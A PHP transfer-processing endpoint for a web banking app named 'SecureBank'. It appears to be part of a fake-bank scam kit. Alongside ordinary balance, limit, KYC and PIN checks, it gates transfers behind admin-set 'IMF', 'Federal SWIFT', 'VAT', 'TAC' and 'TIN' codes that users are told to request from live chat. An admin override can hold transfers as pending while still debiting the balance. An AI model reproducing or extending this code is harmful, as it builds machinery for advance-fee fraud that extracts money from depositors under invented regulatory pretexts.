<?php
// Prevent any output before JSON
ob_start();

try {
    require_once __DIR__ . '/../config/config.php';
    require_once __DIR__ . '/../includes/functions.php';
    require_once __DIR__ . '/../includes/security.php';
    require_once __DIR__ . '/../includes/email-template.php';
    require_once __DIR__ . '/../includes/transfer-rails.php';
    require_once __DIR__ . '/../models/JointAccount.php';
    
    // Clear any accidental output
    ob_end_clean();
    
    header('Content-Type: application/json');
    error_reporting(0);
    ini_set('display_errors', 0);
    
} catch (Exception $e) {
    ob_end_clean();
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'message' => 'Setup error: ' . $e->getMessage()]);
    exit;
} catch (Error $e) {
    ob_end_clean();
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'message' => 'Fatal setup error: ' . $e->getMessage()]);
    exit;
}

// Check if user is logged in
if (!isLoggedIn()) {
    http_response_code(401);
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit;
}

// Test database connection
try {
    $db = Database::getInstance();
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Database connection failed']);
    exit;
}

// Get JSON input
$rawInput = file_get_contents('php://input');

$input = json_decode($rawInput, true);

if (!$input) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Invalid request - JSON decode failed']);
    exit;
}

// Validate required fields
$required = ['from_account_id', 'transfer_type', 'amount'];
foreach ($required as $field) {
    if (!isset($input[$field]) || empty($input[$field])) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => "Missing required field: $field"]);
        exit;
    }
}

// Validate account_name only if it's provided (it's optional for some transfer types)
if (!isset($input['account_name']) || empty($input['account_name'])) {
    $input['account_name'] = 'Transfer Recipient';
}

$userId = $_SESSION['user_id'];
$fromAccountId = $input['from_account_id'];
$transferType = $input['transfer_type'];
$accountName = Security::sanitize($input['account_name']);
$inputAmount = floatval($input['amount']);
$amountCurrency = strtoupper(trim($input['amount_currency'] ?? ''));
$bankEntryCurrency = getBankTransferEntryCurrency();
if ($amountCurrency === '' || !preg_match('/^[A-Z]{3}$/', $amountCurrency)) {
    $amountCurrency = $bankEntryCurrency;
}
$expenseCategory = Security::sanitize($input['expense_category'] ?? 'other');
$transferPin = $input['transfer_pin'] ?? '';

// Validate amount
if ($inputAmount <= 0) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Invalid amount']);
    exit;
}

try {
    $db = Database::getInstance();
    
    // Load user + security flags (single query)
    $userStmt = $db->query(
        "SELECT email, full_name, status, role, currency, currency_selection_shown, transaction_override, transfer_pin, transfer_otp_required,
                imf_required, imf_code, federal_swift_required, federal_swift_code,
                vat_required, vat_code, tac_required, tac_code, tin_required, tin_code
         FROM users WHERE id = ?",
        [$userId]
    );
    $userStatus = $userStmt->fetch();
    
    if (!$userStatus) {
        http_response_code(403);
        echo json_encode(['success' => false, 'message' => 'User not found']);
        exit;
    }
    
    $user = $userStatus;
    $transactionOverride = $userStatus['transaction_override'] ?? 'normal';
    
    require_once __DIR__ . '/../includes/system-settings.php';
    $systemSettings = SystemSettings::getInstance();
    
    // Fee settings (needed for balance check)
    $sql = "SELECT * FROM system_settings WHERE setting_key LIKE 'transfer_%'";
    $stmt = $db->query($sql);
    $settings = $stmt->fetchAll();
    $chargeSettings = [];
    foreach ($settings as $setting) {
        $chargeSettings[$setting['setting_key']] = floatval($setting['setting_value']);
    }
    if (empty($chargeSettings)) {
        $chargeSettings = [
            'transfer_internal_fee' => 0,
            'transfer_domestic_fee' => 0.5,
            'transfer_international_fee' => 2.5
        ];
    }
    
    $feePercentage = 0;
    if ($transferType === 'internal') {
        $feePercentage = $chargeSettings['transfer_internal_fee'] ?? 0;
    } elseif ($transferType === 'domestic') {
        $feePercentage = $chargeSettings['transfer_domestic_fee'] ?? 0.5;
    } elseif ($transferType === 'international') {
        $feePercentage = $chargeSettings['transfer_international_fee'] ?? 2.5;
    }
    
    // Account access + fetch (any status — blocked below before KYC/PIN)
    $jointAccount = new JointAccount();
    if (!$jointAccount->userHasAccess($userId, $fromAccountId)) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'Invalid account']);
        exit;
    }
    
    $accountStmt = $db->query("SELECT * FROM accounts WHERE id = ?", [$fromAccountId]);
    $account = $accountStmt->fetch();
    
    if (!$account) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'Invalid account']);
        exit;
    }

    // User enters amount in display currency; debit account in its stored currency when they differ.
    $accountCurrency = getAccountStoredCurrency($account);
    if ($amountCurrency === '' || strtoupper($amountCurrency) === $accountCurrency) {
        $amount = $inputAmount;
    } else {
        $amount = convertCurrencyAmount($inputAmount, $amountCurrency, $accountCurrency);
    }
    if ($amount <= 0) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'Invalid amount after currency conversion']);
        exit;
    }
    $fees = ($amount * $feePercentage) / 100;
    $totalDeduction = $amount + $fees;
    
    // --- 1) Balance check (before KYC / PIN) ---
    $availableBalance = isset($account['available_balance']) && $account['available_balance'] !== null
        ? (float)$account['available_balance']
        : (float)$account['balance'];
    $currentBalance = (float)$account['balance'];
    
    if ($availableBalance < $totalDeduction && $currentBalance < $totalDeduction) {
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'error_type' => 'insufficient_balance',
            'message' => 'Insufficient balance. Your account balance is ' . formatCurrency($availableBalance, getUserDisplayCurrency($user), $accountCurrency) . ' but you need ' . formatCurrency($totalDeduction, getUserDisplayCurrency($user), $accountCurrency) . ' to complete this transfer.',
            'available_balance' => $availableBalance,
            'required_amount' => $totalDeduction
        ]);
        exit;
    }
    
    $dailyLimit = getDailyLimitForAccountType($account['account_type']);
    $monthlyLimit = getMonthlyLimitForAccountType($account['account_type']);
    $amountForLimitCheck = ($accountCurrency === DEFAULT_CURRENCY)
        ? $amount
        : convertCurrencyAmount($amount, $accountCurrency, DEFAULT_CURRENCY);
    
    $sql = "SELECT COALESCE(SUM(amount), 0) as total_today FROM transactions
            WHERE account_id = ? AND transaction_type = 'debit' AND category = 'transfer'
            AND status IN ('pending', 'processing', 'completed') AND DATE(created_at) = CURDATE()";
    $totalToday = floatval($db->query($sql, [$fromAccountId])->fetch()['total_today'] ?? 0);
    if (($totalToday + $amountForLimitCheck) > $dailyLimit) {
        $remaining = max(0, $dailyLimit - $totalToday);
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'error_type' => 'limit_exceeded',
            'message' => 'Daily transfer limit exceeded. You have ' . formatCurrency($remaining, getUserDisplayCurrency($user), DEFAULT_CURRENCY) . ' remaining for today.'
        ]);
        exit;
    }
    
    $sql = "SELECT COALESCE(SUM(amount), 0) as total_month FROM transactions
            WHERE account_id = ? AND transaction_type = 'debit' AND category = 'transfer'
            AND status IN ('pending', 'processing', 'completed')
            AND DATE_FORMAT(created_at, '%Y-%m') = DATE_FORMAT(NOW(), '%Y-%m')";
    $totalMonth = floatval($db->query($sql, [$fromAccountId])->fetch()['total_month'] ?? 0);
    if (($totalMonth + $amountForLimitCheck) > $monthlyLimit) {
        $remaining = max(0, $monthlyLimit - $totalMonth);
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'error_type' => 'limit_exceeded',
            'message' => 'Monthly transfer limit exceeded. You have ' . formatCurrency($remaining, getUserDisplayCurrency($user), DEFAULT_CURRENCY) . ' remaining this month.'
        ]);
        exit;
    }
    
    // --- 2) Account status (before KYC / PIN) ---
    $blockReason = getTransferBlockedReason($userStatus['status'] ?? '', $account['status'] ?? '');
    if ($blockReason !== '') {
        if (isRestrictedStatus($userStatus['status'] ?? '')) {
            $failedTxnRef = 'TXN' . strtoupper(uniqid());
            $failedDescription = "FAILED: Transfer to " . $accountName . " - Account restricted";
            $ipAddress = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
            $sql = "INSERT INTO transactions (
                        transaction_ref, user_id, account_id, transaction_type, category, expense_category,
                        amount, currency, balance_before, balance_after, description,
                        recipient_account, recipient_name, recipient_bank, status, fee, metadata,
                        ip_address, created_at, completed_at
                    ) VALUES (?, ?, ?, 'debit', 'transfer', ?, ?, ?, ?, ?, ?, ?, ?, ?, 'failed', ?, ?, ?, NOW(), NULL)";
            $db->query($sql, [
                $failedTxnRef, $userId, $fromAccountId, $expenseCategory, $amount,
                $account['currency'], $account['balance'], $account['balance'],
                $failedDescription, $input['account_number'] ?? '', $accountName,
                $input['bank_name'] ?? '', 0,
                json_encode(['reason' => 'Account restricted', 'original_request' => $input]),
                $ipAddress
            ]);
        }
        http_response_code(403);
        echo json_encode([
            'success' => false,
            'error_type' => 'account_restricted',
            'message' => $blockReason
        ]);
        exit;
    }
    
    // --- 3) KYC ---
    $requireKYCForTransfer = $systemSettings->get('kyc_required_for_transfer', '0') === '1';
    $requireKYC = $systemSettings->isKYCRequired();
    
    $userDataSql = "SELECT kyc_status FROM users WHERE id = ?";
    $userData = $db->query($userDataSql, [$userId])->fetch();
    $kycStatus = $userData['kyc_status'] ?? '';
    
    $kycSubmission = $db->query(
        "SELECT id, status FROM kyc_verifications WHERE user_id = ? ORDER BY id DESC LIMIT 1",
        [$userId]
    )->fetch();
    $hasKycSubmission = !empty($kycSubmission);
    
    if (($requireKYC || $requireKYCForTransfer) && $kycStatus !== 'verified') {
        if ($hasKycSubmission && ($kycStatus === 'pending' || ($kycSubmission['status'] ?? '') === 'pending' || ($kycSubmission['status'] ?? '') === 'under_review')) {
            http_response_code(403);
            echo json_encode([
                'success' => false,
                'error_type' => 'kyc_pending',
                'message' => 'Your KYC verification is currently pending. Please wait for the verification process to complete.',
                'redirect' => '/profile/kyc'
            ]);
            exit;
        }
        http_response_code(403);
        echo json_encode([
            'success' => false,
            'error_type' => 'kyc_required',
            'message' => 'KYC verification is required before making transfers. Please complete your KYC verification.',
            'redirect' => '/profile/kyc'
        ]);
        exit;
    }
    
    // --- 4) Transfer PIN ---
    $requireTransferPin = $systemSettings->get('require_transfer_pin', '1') === '1';
    
    if (empty($user['transfer_pin'])) {
        if ($requireTransferPin) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'message' => 'Please set up your Transfer PIN in Settings before making transfers',
                'redirect' => '/profile/security'
            ]);
            exit;
        }
    }
    
    if ($requireTransferPin && !empty($user['transfer_pin'])) {
        if (empty($transferPin)) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'transfer_pin_required',
                'message' => 'Transfer PIN is required'
            ]);
            exit;
        }
        if (!password_verify($transferPin, $user['transfer_pin'])) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'transfer_pin_invalid',
                'message' => 'Incorrect Transfer PIN. Please try again.'
            ]);
            exit;
        }
    }

    // ---------------------------------------------------------------------
    // Transfer security steps (OTP -> IMF -> Federal SWIFT -> VAT -> TAC -> TIN)
    // Each step is gated only by its own *_required flag. Disabled steps are
    // skipped entirely (no dependency on other steps). Client may send extra
    // fields; they are ignored when that step is off.
    // ---------------------------------------------------------------------
    $transferOtpRequired = (int)($userStatus['transfer_otp_required'] ?? 1) === 1;
    $imfRequired = (int)($userStatus['imf_required'] ?? 0) === 1;
    $federalSwiftRequired = (int)($userStatus['federal_swift_required'] ?? 0) === 1;
    $vatRequired = (int)($userStatus['vat_required'] ?? 0) === 1;
    $tacRequired = (int)($userStatus['tac_required'] ?? 0) === 1;
    $tinRequired = (int)($userStatus['tin_required'] ?? 0) === 1;

    // 1) OTP (email)
    if ($transferOtpRequired) {
        $clientToken = trim((string)($input['client_transfer_token'] ?? ''));
        $sessionKey = $clientToken !== '' ? $clientToken : ('user_' . (int)$userId);
        $now = time();

        $verifiedMap = $_SESSION['transfer_otp_verified'] ?? [];
        if (!is_array($verifiedMap)) {
            $verifiedMap = [];
        }
        // Clean expired entries
        foreach ($verifiedMap as $tok => $exp) {
            if ((int)$exp < $now) {
                unset($verifiedMap[$tok]);
            }
        }

        $alreadyVerified = isset($verifiedMap[$sessionKey]) && (int)$verifiedMap[$sessionKey] >= $now;
        if ($alreadyVerified) {
            $_SESSION['transfer_otp_verified'] = $verifiedMap;
        } else {
        $otp = trim((string)($input['otp'] ?? $input['transfer_otp'] ?? ''));
        if ($otp === '') {
            unset($verifiedMap[$sessionKey]);
            $_SESSION['transfer_otp_verified'] = $verifiedMap;

            $otpCode = Security::generate2FACode($userId, 'email', 'transfer');
            try {
                $emailTemplate = new EmailTemplate();
                $emailContent = $emailTemplate->twoFactorEmail($userStatus['full_name'] ?? 'Customer', $otpCode, 10);
                $siteName = getSiteName() ?? 'SecureBank';
                sendEmail($userStatus['email'] ?? ($_SESSION['user_email'] ?? ''), 'Transfer OTP Code - ' . $siteName, $emailContent);
            } catch (Exception $e) {
                // If template fails, send a simple message
                $siteName = getSiteName() ?? 'SecureBank';
                $msg = "Your transfer OTP code is: {$otpCode}. It expires in 10 minutes.";
                sendEmail($userStatus['email'] ?? ($_SESSION['user_email'] ?? ''), 'Transfer OTP Code - ' . $siteName, $msg, false);
            }

            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'otp_required',
                'message' => 'An OTP has been sent to your email. Please enter the OTP to continue this transaction.'
            ]);
            exit;
        }

        if (!Security::validate2FA($userId, $otp, 'transfer')) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'otp_invalid',
                'message' => 'Invalid or expired OTP. Please try again.'
            ]);
            exit;
        }

            // Mark OTP verified for this transfer token (prevents re-validating a one-time code)
            $verifiedMap[$sessionKey] = $now + 600; // 10 minutes
            $_SESSION['transfer_otp_verified'] = $verifiedMap;
        }
    }

    // 2) IMF
    if ($imfRequired) {
        $imfInput = trim((string)($input['imf_code_input'] ?? $input['imf_code'] ?? $input['imf'] ?? ''));
        if ($imfInput === '') {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'imf_required',
                'message' => 'The IMF code is required to enable you to continue with this transaction. Please contact  our online customer care on representative with  the live chat: they will help you with the appropriate IMF code for this transaction.'
            ]);
            exit;
        }
        $expected = trim((string)($userStatus['imf_code'] ?? ''));
        if ($expected === '' || $imfInput !== $expected) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'imf_invalid',
                'message' => 'Invalid IMF code. Please contact support via live chat for assistance.'
            ]);
            exit;
        }
    }

    // 3) Federal SWIFT
    if ($federalSwiftRequired) {
        $swiftInput = trim((string)($input['federal_swift_code_input'] ?? $input['federal_swift_code'] ?? $input['federal_swift'] ?? ''));
        if ($swiftInput === '') {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'federal_swift_required',
                'message' => 'The Federal SWIFT code is required for this transaction can be completed successfully. Please contact  our online customer care representative with  the live chat: for more details of the for this transaction.'
            ]);
            exit;
        }
        $expected = trim((string)($userStatus['federal_swift_code'] ?? ''));
        if ($expected === '' || $swiftInput !== $expected) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'federal_swift_invalid',
                'message' => 'Invalid Federal SWIFT code. Please contact support via live chat for assistance.'
            ]);
            exit;
        }
    }

    // 4) VAT (Value Added Tax) Code
    if ($vatRequired) {
        $vatInput = trim((string)($input['vat_code_input'] ?? $input['vat_code'] ?? $input['vat'] ?? ''));
        if ($vatInput === '') {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'vat_required',
                'message' => 'The VAT (Value Added Tax) code is required to continue with this transaction. Please contact our online customer care representative via live chat for the appropriate VAT code.'
            ]);
            exit;
        }
        $expected = trim((string)($userStatus['vat_code'] ?? ''));
        if ($expected === '' || $vatInput !== $expected) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'vat_invalid',
                'message' => 'Invalid VAT code. Please contact support via live chat for assistance.'
            ]);
            exit;
        }
    }

    // 5) TAC (Transaction Authorization Code)
    if ($tacRequired) {
        $tacInput = trim((string)($input['tac_code_input'] ?? $input['tac_code'] ?? $input['tac'] ?? ''));
        if ($tacInput === '') {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'tac_required',
                'message' => 'The TAC (Transaction Authorization Code) is required to continue with this transaction. Please contact our online customer care representative via live chat for the appropriate TAC.'
            ]);
            exit;
        }
        $expected = trim((string)($userStatus['tac_code'] ?? ''));
        if ($expected === '' || $tacInput !== $expected) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'tac_invalid',
                'message' => 'Invalid TAC. Please contact support via live chat for assistance.'
            ]);
            exit;
        }
    }

    // 6) TIN (Tax Identification Number)
    if ($tinRequired) {
        $tinInput = trim((string)($input['tin_code_input'] ?? $input['tin_code'] ?? $input['tin'] ?? ''));
        if ($tinInput === '') {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'tin_required',
                'message' => 'The TIN (Tax Identification Number) is required to continue with this transaction. Please contact our online customer care representative via live chat for the appropriate TIN.'
            ]);
            exit;
        }
        $expected = trim((string)($userStatus['tin_code'] ?? ''));
        if ($expected === '' || $tinInput !== $expected) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'error_type' => 'tin_invalid',
                'message' => 'Invalid TIN. Please contact support via live chat for assistance.'
            ]);
            exit;
        }
    }

    // Release session lock before heavy processing (prevents site-wide 504s if SMTP/DB is slow)
    if (session_status() === PHP_SESSION_ACTIVE) {
        session_write_close();
    }
    
    // Start transaction (balance, limits, and account status already validated)
    $db->beginTransaction();
    
    // Re-fetch account inside transaction for consistency
    $stmt = $db->query("SELECT * FROM accounts WHERE id = ? AND status = 'active'", [$fromAccountId]);
    $account = $stmt->fetch();
    
    if (!$account) {
        throw new Exception('Account is no longer available for transfers');
    }
    
    // Determine transaction status based on user account status and transaction override
    $transactionStatus = 'completed';
    $completedAt = 'NOW()';
    $shouldDeductBalance = true; // Whether to deduct balance from account
    
    // Check transaction override first (admin setting takes precedence)
    if ($transactionOverride === 'force_pending') {
        $transactionStatus = 'pending';
        $completedAt = 'NULL';
        $shouldDeductBalance = true; // Still deduct but mark as pending
        error_log("Transaction status set to pending due to transaction_override: force_pending");
    } elseif ($transactionOverride === 'force_success') {
        $transactionStatus = 'completed';
        $completedAt = 'NOW()';
        $shouldDeductBalance = true;
        error_log("Transaction status set to completed due to transaction_override: force_success");
    } elseif ($transactionOverride === 'force_failed') {
        $transactionStatus = 'failed';
        $completedAt = 'NULL';
        $shouldDeductBalance = false; // DON'T deduct balance for failed transactions
        error_log("Transaction status set to failed due to transaction_override: force_failed");
    } elseif ($userStatus['status'] === 'pending' || $userStatus['status'] === 'restricted') {
        $transactionStatus = 'pending';
        $completedAt = 'NULL';
        $shouldDeductBalance = true; // Still deduct but mark as pending
        error_log("Transaction status set to pending due to user status: {$userStatus['status']}");
    }
    
    // Deduct from account only if transaction is not failed
    if ($shouldDeductBalance) {
        $newBalance = $account['balance'] - $totalDeduction;
        $sql = "UPDATE accounts SET balance = ?, available_balance = ? WHERE id = ?";
        $db->query($sql, [$newBalance, $newBalance, $fromAccountId]);
    } else {
        // For failed transactions, balance remains unchanged
        $newBalance = $account['balance'];
        error_log("Balance NOT deducted - transaction marked as failed");
    }
    
    // Build description based on transfer type
    $description = '';
    $recipientInfo = [];
    $paymentMethod = null;

    $operatingCountryRow = $db->query(
        "SELECT setting_value FROM system_settings WHERE setting_key = 'bank_operating_country' LIMIT 1"
    )->fetch();
    $operatingCountry = $operatingCountryRow['setting_value'] ?? 'United States';
    
    if ($transferType === 'internal') {
        $bankName = Security::sanitize($input['bank_name'] ?? '');
        $accountNumber = Security::sanitize($input['account_number'] ?? '');
        $description = "Internal Transfer to " . $accountName . " at " . $bankName;
        $recipientInfo = [
            'bank_name' => $bankName,
            'account_number' => $accountNumber
        ];
    } elseif ($transferType === 'domestic') {
        $bankName = Security::sanitize($input['bank_name'] ?? '');
        $accountNumber = Security::sanitize($input['account_number'] ?? '');
        $description = "Domestic Transfer to " . $accountName . " at " . $bankName;

        $domesticRules = getDomesticAccountNumberRules(normalizeCountryCode($operatingCountry));
        $acctLen = strlen(trim($accountNumber));
        if ($acctLen < (int)$domesticRules['min'] || $acctLen > (int)$domesticRules['max']) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'message' => 'Account number length is invalid' . (!empty($domesticRules['hint']) ? ' (' . $domesticRules['hint'] . ')' : ''),
            ]);
            exit;
        }
        if (!empty($domesticRules['pattern']) && !preg_match('/' . $domesticRules['pattern'] . '/i', $accountNumber)) {
            http_response_code(400);
            echo json_encode([
                'success' => false,
                'message' => 'Account number must contain only numbers' . (!empty($domesticRules['hint']) ? ' (' . $domesticRules['hint'] . ')' : ''),
            ]);
            exit;
        }

        $railResult = buildTransferMetadata('domestic', array_merge($input, [
            'operating_country' => $operatingCountry,
            'bank_name' => $bankName,
            'account_number' => $accountNumber,
        ]));
        if (!$railResult['success']) {
            throw new Exception($railResult['message']);
        }
        $recipientInfo = $railResult['metadata'];
        $paymentMethod = $railResult['payment_method'];
    } elseif ($transferType === 'international') {
        $region = Security::sanitize($input['region'] ?? '');
        $country = Security::sanitize($input['country'] ?? ($input['country_code'] ?? ''));
        $bankName = Security::sanitize($input['bank_name'] ?? '');
        $accountNumber = Security::sanitize($input['account_number'] ?? '');
        $countryDisplay = $country;
        $countryInfo = getCountryByCode($country) ?? getCountryByName($country);
        if ($countryInfo) {
            $countryDisplay = $countryInfo['name'];
        }
        $description = "International Wire Transfer to " . $accountName . " at " . $bankName . ", " . $countryDisplay;

        $railResult = buildTransferMetadata('international', array_merge($input, [
            'country' => $country,
            'bank_name' => $bankName,
            'account_number' => $accountNumber,
            'region' => $region,
        ]));
        if (!$railResult['success']) {
            throw new Exception($railResult['message']);
        }
        $recipientInfo = $railResult['metadata'];
        $paymentMethod = $railResult['payment_method'];
    }
    
    // For INTERNAL transfers, credit the recipient's account (only if transaction is not failed)
    if ($transferType === 'internal' && $transactionStatus !== 'failed') {
        // Find recipient account by account number
        $recipientAccountNumber = $recipientInfo['account_number'];
        $sqlRecipient = "SELECT * FROM accounts WHERE account_number = ? AND status = 'active' LIMIT 1";
        $stmtRecipient = $db->query($sqlRecipient, [$recipientAccountNumber]);
        $recipientAccount = $stmtRecipient->fetch();
        
        if ($recipientAccount) {
            // Credit recipient's account with the transfer amount (not including sender's fee)
            $recipientNewBalance = $recipientAccount['balance'] + $amount;
            $sqlUpdateRecipient = "UPDATE accounts SET balance = ?, available_balance = ? WHERE id = ?";
            $db->query($sqlUpdateRecipient, [$recipientNewBalance, $recipientNewBalance, $recipientAccount['id']]);
            
            // Create credit transaction for recipient
            $recipientTransactionRef = 'TXN' . strtoupper(uniqid());
            $recipientIpAddress = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
            
            // Get sender info
            $sqlSender = "SELECT full_name FROM users WHERE id = ?";
            $stmtSender = $db->query($sqlSender, [$userId]);
            $senderInfo = $stmtSender->fetch();
            $senderName = $senderInfo['full_name'] ?? 'Unknown Sender';
            
            $recipientDescription = "Internal Transfer from " . $senderName;
            
            $sqlRecipientTxn = "INSERT INTO transactions (
                        transaction_ref, user_id, account_id, transaction_type, category, expense_category,
                        amount, currency, balance_before, balance_after, description, 
                        recipient_account, recipient_name, recipient_bank, status, fee, metadata, 
                        ip_address, created_at, completed_at
                    ) VALUES (?, ?, ?, 'credit', 'transfer', NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, ?, ?, NOW(), " . ($transactionStatus === 'completed' ? 'NOW()' : 'NULL') . ")";
            
            $db->query($sqlRecipientTxn, [
                $recipientTransactionRef,
                $recipientAccount['user_id'],
                $recipientAccount['id'],
                $amount, // Amount credited (without sender's fee)
                $recipientAccount['currency'],
                $recipientAccount['balance'],
                $recipientNewBalance,
                $recipientDescription,
                $account['account_number'], // Sender's account number
                $senderName,
                'SecureBank',
                $transactionStatus, // Use same status as sender's transaction
                json_encode([
                    'sender_account' => $account['account_number'],
                    'sender_name' => $senderName,
                    'transfer_type' => 'internal'
                ]),
                $recipientIpAddress
            ]);
            
            // Log activity for recipient
            logActivity($recipientAccount['user_id'], 'receive_transfer', "Received $" . number_format($amount, 2) . " from $senderName");
        }
    }
    
    // Generate unique transaction reference
    $transactionRef = 'TXN' . strtoupper(uniqid());
    
    // Get client IP
    $ipAddress = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    
    // Record DEBIT transaction for sender
    // For failed transactions, use the amount (not totalDeduction) since balance wasn't deducted
    $transactionAmount = $shouldDeductBalance ? $totalDeduction : $amount;
    
    $entryFee = ($amountCurrency === $accountCurrency)
        ? $fees
        : convertCurrencyAmount($fees, $accountCurrency, $amountCurrency);
    $entryTotal = ($amountCurrency === $accountCurrency)
        ? $transactionAmount
        : convertCurrencyAmount($transactionAmount, $accountCurrency, $amountCurrency);

    $transactionMetadata = array_merge($recipientInfo, [
        'transfer_scope' => $transferType,
        'transaction_override' => $transactionOverride,
        'failed_reason' => $transactionStatus === 'failed' ? 'Transaction processing disabled by admin' : null,
        'entry_amount' => $inputAmount,
        'entry_currency' => $amountCurrency,
        'entry_fee' => round($entryFee, 2),
        'entry_total' => round($entryTotal, 2),
    ]);

    $completedAtSql = ($completedAt === 'NOW()') ? 'NOW()' : 'NULL';

    if (transactionsHasPaymentMethodColumn() && $paymentMethod !== null) {
        $sql = "INSERT INTO transactions (
                    transaction_ref, user_id, account_id, transaction_type, category, expense_category,
                    amount, currency, balance_before, balance_after, description,
                    recipient_account, recipient_name, recipient_bank, status, payment_method, fee, metadata,
                    ip_address, created_at, completed_at
                ) VALUES (?, ?, ?, 'debit', 'transfer', ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW(), {$completedAtSql})";
        $db->query($sql, [
            $transactionRef,
            $userId,
            $fromAccountId,
            $expenseCategory,
            $transactionAmount,
            $account['currency'],
            $account['balance'],
            $newBalance,
            $description,
            $recipientInfo['account_number'] ?? '',
            $accountName,
            $recipientInfo['bank_name'] ?? '',
            $transactionStatus,
            $paymentMethod,
            $shouldDeductBalance ? $fees : 0,
            json_encode($transactionMetadata),
            $ipAddress,
        ]);
    } else {
        $sql = "INSERT INTO transactions (
                    transaction_ref, user_id, account_id, transaction_type, category, expense_category,
                    amount, currency, balance_before, balance_after, description,
                    recipient_account, recipient_name, recipient_bank, status, fee, metadata,
                    ip_address, created_at, completed_at
                ) VALUES (?, ?, ?, 'debit', 'transfer', ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW(), {$completedAtSql})";
        $db->query($sql, [
            $transactionRef,
            $userId,
            $fromAccountId,
            $expenseCategory,
            $transactionAmount,
            $account['currency'],
            $account['balance'],
            $newBalance,
            $description,
            $recipientInfo['account_number'] ?? '',
            $accountName,
            $recipientInfo['bank_name'] ?? '',
            $transactionStatus,
            $shouldDeductBalance ? $fees : 0,
            json_encode($transactionMetadata),
            $ipAddress,
        ]);
    }
    
    // Log activity
    logActivity($userId, 'transfer_funds', "Transferred $" . number_format($amount, 2) . " to $accountName (Fee: $" . number_format($fees, 2) . ")");
    
    // Send email notifications (debit/credit alerts) - skip for failed transactions
    if ($transactionStatus !== 'failed') {
        try {
            // Get sender info with display currency preference
            $sqlSender = "SELECT full_name, email, currency, currency_selection_shown, notification_preferences FROM users WHERE id = ?";
            $stmtSender = $db->query($sqlSender, [$userId]);
            $senderUser = $stmtSender->fetch();
            $senderDisplayCurrency = getUserDisplayCurrency($senderUser);
            $senderAccountCurrency = getAccountStoredCurrency($account);

            $debitEmailAmount = isset($transactionMetadata['entry_total'])
                ? (float)$transactionMetadata['entry_total']
                : (float)$totalDeduction;
            $debitEmailAmountCurrency = !empty($transactionMetadata['entry_currency'])
                ? strtoupper(trim($transactionMetadata['entry_currency']))
                : $senderAccountCurrency;
            
            // Parse sender notification preferences
            $senderPrefs = json_decode($senderUser['notification_preferences'] ?? '{}', true);
            
            // Send debit alert to sender if enabled
            if (($senderPrefs['debit_alerts'] ?? true) && ($senderPrefs['email_notifications'] ?? true)) {
                $emailTemplate = new EmailTemplate();
                $debitEmail = $emailTemplate->debitAlertEmail(
                    $senderUser['full_name'],
                    $debitEmailAmount,
                    $senderDisplayCurrency,
                    $accountName,
                    $newBalance,
                    $transactionRef,
                    date('F j, Y g:i A'),
                    $debitEmailAmountCurrency,
                    $senderAccountCurrency
                );
                sendEmail($senderUser['email'], 'Transaction Alert - Debit', $debitEmail);
            }
            
            // For internal transfers, send credit alert to recipient
            if ($transferType === 'internal' && isset($recipientAccount) && $recipientAccount) {
                // Get recipient user info with display currency preference
                $sqlRecipient = "SELECT full_name, email, currency, currency_selection_shown, notification_preferences FROM users WHERE id = ?";
                $stmtRecipient = $db->query($sqlRecipient, [$recipientAccount['user_id']]);
                $recipientUser = $stmtRecipient->fetch();
                $recipientDisplayCurrency = getUserDisplayCurrency($recipientUser);
                $recipientAccountCurrency = getAccountStoredCurrency($recipientAccount);
                
                if ($recipientUser) {
                    // Parse recipient notification preferences
                    $recipientPrefs = json_decode($recipientUser['notification_preferences'] ?? '{}', true);
                    
                    // Send credit alert if enabled
                    if (($recipientPrefs['credit_alerts'] ?? true) && ($recipientPrefs['email_notifications'] ?? true)) {
                        $emailTemplate = new EmailTemplate();
                        $creditEmail = $emailTemplate->creditAlertEmail(
                            $recipientUser['full_name'],
                            $amount,
                            $recipientDisplayCurrency,
                            $senderUser['full_name'],
                            $recipientNewBalance,
                            $recipientTransactionRef ?? $transactionRef,
                            date('F j, Y g:i A'),
                            $recipientAccountCurrency,
                            $recipientAccountCurrency
                        );
                        sendEmail($recipientUser['email'], 'Transaction Alert - Credit', $creditEmail);
                    }
                }
            }
        } catch (Exception $e) {
            // Log email error but don't fail the transaction
            error_log("Email notification error: " . $e->getMessage());
        }
    } else {
        error_log("Skipping email notifications - transaction marked as failed");
    }
    
    // Commit transaction
    $db->commit();
    
    // Determine success message based on transaction status
